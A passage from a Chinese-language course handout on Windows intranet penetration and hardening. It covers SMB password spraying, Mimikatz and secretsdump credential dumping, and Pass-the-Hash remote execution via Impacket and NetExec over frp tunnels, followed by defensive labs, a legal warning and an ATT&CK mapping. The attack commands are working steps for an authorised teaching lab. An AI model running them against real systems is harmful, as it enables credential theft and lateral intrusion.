**第二步：使用 Medusa 进行 SMB 密码喷洒**

```bash
medusa -h <ECS公网IP> -u administrator -P /tmp/passwords.txt -M smbnt -n 10004
```

---

### 实验10：Pass-the-Hash 横向移动

> ⚠️ **前置条件**：已获取 SRV02 的管理员凭据。

**Impacket 安装**：

```bash
sudo apt update
sudo apt install -y impacket-scripts python3-impacket netexec
which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
```

**第一步：获取 NTLM 哈希**

```bash
# 方法一：通过 Evil-WinRM（通过 frp WinRM 隧道）
evil-winrm -i <ECS公网IP> -P 10003 -u administrator -p 'P@ssw0rd'

# 在 Evil-WinRM 会话中获取哈希
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
# 或上传并执行 mimikatz
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 记录输出中的 NTLM 哈希：
# Username : administrator
# NTLM     : <NTLM_HASH值>
```

```bash
# 方法二：通过 SOCKS5 代理使用 secretsdump
# proxychains 配置：socks5 <ECS公网IP> 10080
proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
```

**第二步：使用获取的哈希进行 PtH 攻击**

```bash
# 方法一：NetExec 验证哈希（通过 frp SMB 映射）
nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'

# 方法二：NetExec 远程执行命令
nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"

# 方法三：Impacket wmiexec（交互式 Shell，走 SOCKS5）
proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1

# 方法四：Impacket psexec（SYSTEM Shell，走 SOCKS5）
proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
```

> 💡 **PtH 的教学意义**：密码哈希在 Windows 认证中等价于明文密码。防御措施：Protected Users 组（禁止 NTLM）、Credential Guard（虚拟化保护凭据）、SMB 签名（防止哈希中继）。

---

### 扩展：域环境渗透（详见实验六）

> 本任务的横向移动实验聚焦于**工作组环境**下的凭据获取与 PtH。域环境的更高级攻击（Kerberoasting、DCSync、黄金票据、BloodHound）详见 **《实验六：Windows域环境渗透与提权》**。

| 项目八（本讲义） | 实验六（独立实验） | 衔接点 |
| --- | --- | --- |
| frp内网穿透 → 建立隧道 | 域信息收集 → 识别域控 | 隧道建立后第一步是信息收集 |
| 弱口令暴力破解 | Kerberoasting → 提权 | 暴力破解的凭据可作为起点 |
| PtH → 工作组横向移动 | DCSync → 域级横向移动 | PtH 获取的域管哈希可直接 DCSync |
| 网络层加固 | 身份层加固 | 两者结合 = 完整防御体系 |

---

## 📝 任务四知识点总结

| 知识点 | 要点 |
| --- | --- |
| 攻击流程 | 踩点→扫描→查点→入侵→提权→持久化→掩盖踪迹 |
| 弱口令攻击 | Hydra/Medusa 通过 frp 隧道暴力破解 |
| Pass-the-Hash | 无需明文密码，仅凭 NTLM 哈希即可认证和横向移动 |
| Impacket 工具族 | psexec（SMB执行）、wmiexec（WMI执行）、secretsdump（哈希导出） |
| frp在渗透中的角色 | 将内网服务映射到公网，使 Impacket/Hydra 等工具可直接攻击 |
| 域级攻击（扩展） | Kerberoasting、DCSync、黄金票据详见《实验六》 |

---

# 任务五 内网安全防御与加固

## 🧠 理论知识

### 内网安全纵深防御体系

```
内网纵深防御五层体系：

第一层：网络隔离
├── 划分安全区域（DMZ/办公区/服务器区/核心区）
├── VLAN + 防火墙规则限制跨区域访问
└── 微分段 —— 每台服务器独立策略

第二层：身份安全
├── 最小权限原则
├── Protected Users组 —— 禁止高权限账户使用NTLM
├── Credential Guard —— 虚拟化保护凭据存储
└── 多因素认证（MFA）

第三层：端点安全
├── EDR（端点检测与响应）
├── 应用白名单、补丁管理
└── 主机防火墙

第四层：监控与检测
├── SIEM（安全信息和事件管理）
├── IDS/IPS、网络流量分析
└── 用户行为分析（UEBA）

第五层：应急响应
├── 应急响应预案
├── 取证与溯源能力
└── 快速隔离与恢复
```

### Tier 管理模型

| 层级 | 范围 | 管理账户 | 隔离规则 |
| --- | --- | --- | --- |
| **Tier 0** | 域控、AD DS | Enterprise/Domain Admins | 禁止登录 Tier 1/2 设备 |
| **Tier 1** | 成员服务器 | Server Admins | 禁止登录 Tier 2 设备 |
| **Tier 2** | 工作站 | Workstation Admins | 可登录普通工作站 |

> 💡 **核心原则**：高权限账户只能在高安全级别的设备上使用——防止域管在普通工作站上被窃取凭据。

---

## 🛠️ 实践操作

### 实验11：内网安全加固

> 本实验在 SRV02 上实施安全加固措施，然后从 Kali 验证加固效果。

**第一步：启用 SMB 签名**

```powershell
# 在 SRV02 上执行

# 通过注册表启用 SMB 签名
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord

# 重启 SMB 服务
Restart-Service LanmanServer -Force
Restart-Service LanmanWorkstation -Force

# 验证
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature
# 预期：RequireSecuritySignature = True
```

**第二步：将高权限账户加入 Protected Users 组**（域环境）

```powershell
# 在域控上执行
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountName
```

> 💡 **效果**：组成员不能使用 NTLM 认证（强制 Kerberos）、不能使用缓存凭据。直接阻断 Pass-the-Hash。

**第三步：配置防火墙限制横向移动**

```powershell
# 在 SRV02 上执行

# 启用防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 限制 RDP 来源（替换 <管理端IP> 为实际 IP）
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
New-NetFirewallRule -DisplayName "RDP-Allow-Admin" -Direction Inbound `
  -Protocol TCP -LocalPort 3389 -Action Allow -RemoteAddress <管理端IP>

# 限制 WinRM 来源
Disable-NetFirewallRule -DisplayGroup "Windows Remote Management"
New-NetFirewallRule -DisplayName "WinRM-Allow-Admin" -Direction Inbound `
  -Protocol TCP -LocalPort 5985 -Action Allow -RemoteAddress <管理端IP>

# 阻止 frp 出站连接（阻止内网穿透工具外连）
New-NetFirewallRule -DisplayName "Block-FRP-Outbound" -Direction Outbound `
  -Protocol TCP -RemotePort 7000 -Action Block
```

**第四步：重置 krbtgt 密码**（域环境，使黄金票据失效）

```powershell
# 必须更改两次（AD 保留上一次密码）
$pwd1 = ConvertTo-SecureString "N3wKrbtgt@2025!A" -AsPlainText -Force
$pwd2 = ConvertTo-SecureString "N3wKrbtgt@2025!B" -AsPlainText -Force

Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd1 -Reset
Start-Sleep -Seconds 60
Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd2 -Reset
```

**第五步：禁用不必要的服务**

```powershell
# 如果不需要 WinRM
Set-Service -Name "WinRM" -StartupType Manual
Stop-Service "WinRM"

# 禁用远程注册表
Set-Service -Name "RemoteRegistry" -StartupType Disabled

# 关闭默认共享
net share C$ /delete
net share ADMIN$ /delete
```

**第六步：验证加固效果**

```bash
# 在 Kali 上验证
nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
# 预期：STATUS_ACCESS_DENIED（Protected Users 生效）
```

---

## 📝 任务五知识点总结

| 知识点 | 要点 |
| --- | --- |
| 纵深防御 | 网络隔离→身份安全→端点安全→监控检测→应急响应 |
| Tier模型 | Tier 0（域控）/ Tier 1（服务器）/ Tier 2（工作站） |
| SMB签名 | 防御 SMB 中继攻击 |
| Protected Users | 禁止 NTLM 认证，直接阻断 PtH |
| krbtgt重置 | 更改两次使黄金票据失效 |
| 防火墙策略 | 限制入站来源（IP白名单）、阻止 frp 出站连接 |
| 最小权限 | 禁用不必要的服务和默认共享 |

---

# ✅ 课前检查清单

| 检查项 | 操作 | 通过标准 |
| --- | --- | --- |
| ECS 安全组 | 阿里云控制台 → 安全组 | 22/7000/7500/10000-20000 端口已放行 |
| ECS SSH 连接 | `ssh root@<ECS公网IP>` | 可正常登录 |
| frps 启动 | `ss -tlnp \| grep 7000` | 7000/7500 端口监听 |
| frp Dashboard | 浏览器访问 `http://<ECS公网IP>:7500` | 显示管理面板 |
| SRV02 虚拟机 | 本地 VMware 启动 Windows Server | 可登录，可 `ping <ECS公网IP>` |
| frpc 连接 | SRV02 运行 `frpc.exe -c frpc.toml` | 显示 "login to server success" |
| 隧道验证 | Kali 上 `nmap -p 10001,10002 <ECS公网IP>` | 端口 open |
| Kali 工具 | `which nmap proxychains4 evil-winrm nxc` | 均存在 |
| Impacket | `sudo apt install -y impacket-scripts python3-impacket netexec` | 命令可用 |

> **实验结束后务必释放 ECS 实例，避免持续扣费。**

---

# 📚 项目八知识点总结

## 核心操作速查表

| 操作 | 命令/方法 |
| --- | --- |
| 阿里云安全组 | ECS 控制台 → 安全组 → 添加入站规则 |
| ECS SSH 连接 | `ssh root@<ECS公网IP>` |
| frps 启动 | `/opt/frp/frps -c /opt/frp/frps.toml` |
| frpc 启动 | `C:\frp\frpc.exe -c C:\frp\frpc.toml` |
| frp Dashboard | `http://<ECS公网IP>:7500` |
| SSH 远程转发 | `ssh -R 远程端口:127.0.0.1:本地端口 root@<ECS公网IP> -N -f` |
| proxychains | `proxychains nmap -sT -p 端口 127.0.0.1` |
| RDP 暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<ECS公网IP> -s 10001` |
| 获取哈希 | `evil-winrm -i <ECS公网IP> -P 10003` + Mimikatz |
| PtH 攻击 | `proxychains impacket-wmiexec -hashes :HASH admin@127.0.0.1` |
| SMB 签名 | `Set-ItemProperty "LanmanServer\Parameters" "RequireSecuritySignature" 1` |
| Protected Users | `Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"` |
| krbtgt 重置 | `Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd -Reset`（两次） |

## 常见错误排查表

| 问题 | 原因 | 解决方法 |
| --- | --- | --- |
| ECS 端口不通 | 安全组未放行 | 在控制台添加入站规则 |
| frpc 连接失败 | Token 不一致/安全组未放行/SRV02 无法上网 | 逐项检查 |
| 隧道已建立但无法访问服务 | 本地服务未启动或配置错误 | 确认服务运行，检查 frpc.toml |
| proxychains 超时 | SOCKS5 隧道断开或配置错误 | 检查 frp SOCKS5 状态和 proxychains 配置 |
| Hydra 超时 | frp 隧道延迟 | 增加 `-w 10`，降低 `-t 1` |
| Evil-WinRM 失败 | WinRM 未启用 | SRV02 上执行 `Enable-PSRemoting -Force` |
| Mimikatz 被拦截 | Windows Defender | 关闭实时防护（仅实验环境） |

---

## 安全意识

### 攻防对抗思维

> **核心理念**：内网安全的本质不是"建高墙"（边界防火墙），而是"建多层墙"（纵深防御）。本项目通过阿里云 ECS + frp 的真实内网穿透场景，展示了攻击者如何利用一条出站连接将整个内网暴露到公网。唯有实施网络分段、身份隔离、终端防护、监控检测等多层防御，才能有效限制攻击扩散。

### 企业环境防御最佳实践

| 防御层次 | 措施 | 对应威胁 |
| --- | --- | --- |
| **网络隔离** | VLAN + 防火墙 + 微分段 | 内网穿透、横向移动 |
| **出站控制** | 限制内网主机出站连接 | frp/nps 等内网穿透工具 |
| **凭据保护** | Credential Guard + Protected Users + 定期改密 | Pass-the-Hash |
| **协议安全** | SMB签名 + LDAP签名 + Kerberos AES | SMB中继、中间人 |
| **端点防护** | EDR + 应用白名单 + 补丁管理 | 恶意工具执行 |
| **日志监控** | SIEM + IDS/IPS + 网络流量分析 | 攻击行为检测 |
| **权限管理** | Tier模型 + 最小权限 + PAM | 权限提升 |
| **应急响应** | 预案制定 + 定期演练 + 取证能力 | 快速处置 |

### 免责与法律意识

> **法律红线**：在中国，《网络安全法》《刑法》第285条（非法侵入计算机信息系统罪）和第286条明确规定，未经授权对计算机信息系统实施渗透测试、植入内网穿透工具等行为属于违法犯罪，最高可处七年有期徒刑。教学实验环境是学习这些技术的唯一合法场景。

---

## 课堂思考

1. **内网穿透检测**：frp 客户端需要主动连接外部服务器的 7000 端口。作为安全运维人员，如何在企业网络中检测和阻止 frp/nps 等内网穿透工具的使用？请列举至少三种检测方法。

2. **Pass-the-Hash防御**：Protected Users 组可以阻断 PtH，但加入该组后管理员在某些场景下可能无法正常工作。如何在安全性和可用性之间取得平衡？

3. **横向移动溯源**：攻击者通过 frp 隧道从外部访问内网，内网服务器看到的连接来源是 frp 客户端的 IP 而非攻击者的真实 IP。在真实企业环境中，如何有效溯源此类攻击？

4. **纵深防御设计**：假设你是一家中小企业的网络安全管理员，请参考本项目所学内容，按优先级列出至少五项核心安全措施，并说明每项措施防御的攻击技术。

5. **云安全**：本项目使用阿里云 ECS 作为穿透服务器。在真实场景中，攻击者也可能利用其他云服务（如 AWS、Azure）或免费的 CDN 服务作为中转。企业应如何应对这种"云上跳板"的攻击模式？

---

## 知识关联

| 关联项目 | 关联内容 |
| --- | --- |
| **项目一·走进Windows服务器** | 网络环境配置是本项目的基础；本项目通过阿里云 ECS 部署 frp，深化网络穿透的理解 |
| **项目四·IIS网站管理** | IIS Web 服务是内网穿透的映射目标；IIS 安全加固在内网中同样重要 |
| **项目五·远程管理** | RDP 和 WinRM 是横向移动的主要通道——暴力破解和远程执行均依赖这些服务 |
| **项目六·域管理** | 域环境为域级渗透提供基础；域用户凭据、krbtgt 等概念直接来自域管理知识 |
| **项目七·应用安全** | 后门持久化技术在横向移动后的"持久化"阶段使用 |
| **实验六·域环境渗透** | 本项目的 PtH 为实验六的域级攻击提供前置技能，两者构成完整攻击链 |

### MITRE ATT&CK 框架映射

| 本项目技术 | ATT&CK战术 | ATT&CK技术ID |
| --- | --- | --- |
| frp/nps内网穿透 | 命令与控制（C2） | T1090 - Proxy |
| SSH隧道 | 命令与控制（C2） | T1572 - Protocol Tunneling |
| Nmap扫描 | 发现（Discovery） | T1046 - Network Service Discovery |
| RDP暴力破解 | 凭证访问 | T1110.001 - Brute Force |
| Pass-the-Hash | 横向移动 | T1550.002 - Pass the Hash |
| PsExec/WMIExec | 横向移动 | T1021.002 - SMB/Windows Admin Shares |
| Evil-WinRM | 横向移动 | T1021.006 - Windows Remote Management |
| secretsdump/DCSync* | 凭证访问 | T1003.006 - DCSync |
| 黄金票据* | 持久化 | T1558.001 - Golden Ticket |

> *标注*的技术在《实验六：Windows域环境渗透与提权》中详细展开
